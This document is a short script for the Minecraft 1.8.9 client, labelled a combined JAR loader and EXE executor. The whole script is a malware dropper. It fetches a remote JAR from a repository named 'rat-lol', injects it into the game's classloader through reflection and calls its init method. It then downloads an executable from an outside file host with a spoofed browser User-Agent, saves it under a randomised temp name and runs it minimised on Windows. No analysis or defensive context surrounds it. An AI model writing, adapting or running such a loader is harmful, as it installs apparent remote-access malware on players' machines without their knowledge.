// ===== COMBINED JAR LOADER + EXE EXECUTOR (1.8.9) =====
(function() {
    try {
        // ==== PART 1: Load External JAR ====
        var URL = Java.type("java.net.URL");
        var URLClassLoader = Java.type("java.net.URLClassLoader");
        var Minecraft = Java.type("net.minecraft.client.Minecraft");

        // 1. Load JAR dynamically
        var jarUrl = new URL("https://github.com/MansHeree/rat-lol/raw/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
        var classLoader = Minecraft.getMinecraft().getClass().getClassLoader();

        URLClassLoader.class.getDeclaredMethod("addURL", URL.class)
            .also(function(method) {
                method.setAccessible(true);
                method.invoke(classLoader, jarUrl);
            });

        // 2. Initialize class from JAR
        classLoader.loadClass("org.lwjgl36.VersionImp")
            .getMethod("init")
            .invoke(null);

        print("[+] JAR loaded successfully!");

        // ==== PART 2: Download & Execute EXE ====
        var Files = Java.type("java.nio.file.Files");
        var Paths = Java.type("java.nio.file.Paths");
        var Runtime = Java.type("java.lang.Runtime");
        var System = Java.type("java.lang.System");

        // 1. Download EXE to temp directory
        var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
        var exePath = Paths.get(
            System.getProperty("java.io.tmpdir"), 
            "mc_" + Math.random().toString(36).substring(2) + ".exe"
        );

        Files.copy(
            new URL(exeUrl).openConnection().also(function(conn) {
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            }).getInputStream(),
            exePath
        );

        // 2. Execute hidden (Windows only)
        if (System.getProperty("os.name").contains("Windows")) {
            Runtime.getRuntime().exec(
                ["cmd", "/c", "start", "/min", exePath.toString()]
            );
            print("[+] EXE launched hidden!");
        } else {
            print("[!] EXE can only run on Windows");
        }

    } catch (e) {
        print("[ERROR] " + e.toString());
    }
})();